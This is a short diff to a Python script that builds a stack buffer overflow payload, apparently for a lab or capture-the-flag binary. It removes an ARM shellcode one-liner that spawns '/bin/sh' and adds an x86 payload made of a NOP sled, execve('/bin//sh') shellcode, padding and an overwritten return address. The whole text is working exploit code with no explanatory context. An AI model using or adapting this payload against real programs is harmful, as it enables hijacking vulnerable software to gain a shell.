@@ -1,9 +1,7 @@
-python3 -c '
 import sys
-sc = (
-    b"\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x78\x46\x0e\x30"
-    b"\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf"
-    b"echo SUCCESS; /bin/sh\x00"
-)
-sys.stdout.buffer.write(sc + b"A"*(44-len(sc)+29) + b"\x70\xf2\xff\xbe")
-' 
+NOP = b'\x90' * 50
+SHELLCODE = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
+PADDING = b'A' * (100 - len(NOP) - len(SHELLCODE))
+NEW_EIP = b'\x00\xfa\xff\xbf' 
+payload = NOP + SHELLCODE + PADDING + NEW_EIP
+sys.stdout.buffer.write(payload)
